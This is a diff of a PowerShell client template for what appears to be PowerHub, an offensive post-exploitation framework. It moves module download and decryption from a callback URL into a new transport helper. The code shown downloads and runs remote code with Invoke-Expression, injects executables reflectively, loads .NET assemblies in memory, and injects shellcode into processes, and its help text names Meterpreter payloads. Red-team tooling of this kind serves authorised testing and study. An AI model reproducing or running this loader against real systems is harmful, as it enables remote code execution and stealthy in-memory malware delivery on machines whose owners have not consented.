@@ -8,7 +8,10 @@ Run 'Help-PowerHub' for help
 
 $CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
 $KEY = ${{symbol_name("KEY")}}
+$WebClient = ${{symbol_name("WebClient")}}
 Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
+Set-Alias -Name Decrypt-String -Value {{symbol_name("Decrypt-String")}}
+Set-Alias -Name Transport-String -Value {{symbol_name("Transport-String")}}
 
 $WEBDAV_URL = "{{webdav_url}}"
 $ErrorActionPreference = "Stop"
@@ -32,12 +35,7 @@ function Unzip-Code {
 }
 
 function Update-HubModules {
-    $URL = "{0}ml" -f $CALLBACK_URL
-    $ModuleList = $WebClient.DownloadString($URL)
-    $ModuleList = [System.Convert]::FromBase64String($ModuleList)
-    $ModuleList = Decrypt-Code $ModuleList $KEY
-    $ModuleList = Unzip-Code $ModuleList
-    $ModuleList = [System.Text.Encoding]::UTF8.GetString($ModuleList)
+    $ModuleList = Transport-String "ml"
     Invoke-Expression $ModuleList
     $Global:Modules = $Modules
 }
@@ -49,12 +47,8 @@ function Import-HubModule {
         $Module
     )
 
-    if ($Module["type"] -eq "ps1") {
+    if ($Module.Type -eq "ps1") {
         $code = $Module.Code
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
-        $code = [System.Text.Encoding]::UTF8.GetString($code)
         $sb = [Scriptblock]::Create($code)
         New-Module -ScriptBlock $sb | Out-Null
     }
@@ -173,10 +167,9 @@ Use the '-Verbose' option to print detailed information.
     $result = @()
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
-            $compression = "&c=1"
-            if ($PS_VERSION -eq 2) { $compression = "" }
-            $url = "{0}m?m={1}{2}" -f $CALLBACK_URL, $i, $compression
-            $Modules[$i].Code = $WebClient.DownloadString($url);
+            $args = @{"m"="$i"}
+            # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
+            $Modules[$i].Code = Transport-String "m" $args
             $Modules[$i].Loaded = $True
             Import-HubModule $Modules[$i]
         }
@@ -247,9 +240,6 @@ Load the exe module with the name 'meterpreter.exe' in memory and run it
                 } else {
                     $code = $n.Code
                 }
-                $code = [System.Convert]::FromBase64String($code)
-                $code = Decrypt-Code $code $KEY
-                $code = Unzip-Code $code
                 Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR -ExeArgs $ExeArgs
             }
         } else {
@@ -293,9 +283,6 @@ Load the exe module with the name 'meterpreter.exe' in memory and save it to dis
             $m = $n
         }
         $code = $m.Code
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
         if ($Directory) {
             $Filename = "$Directory/$($m.BaseName)"
         } else {
@@ -343,9 +330,6 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
             $m = $n
         }
         $code = $m.Code
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
         $a = [Reflection.Assembly]::Load([byte[]]$code)
         $al = New-Object -TypeName System.Collections.ArrayList
         $al.add($Arguments)
@@ -391,9 +375,6 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
                 $m = $n
             }
             $code = $m.Code
-            $code = [System.Convert]::FromBase64String($code)
-            $code = Decrypt-Code $code $KEY
-            $code = Unzip-Code $code
             if ($ProcessID) {
                 Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
             } else {
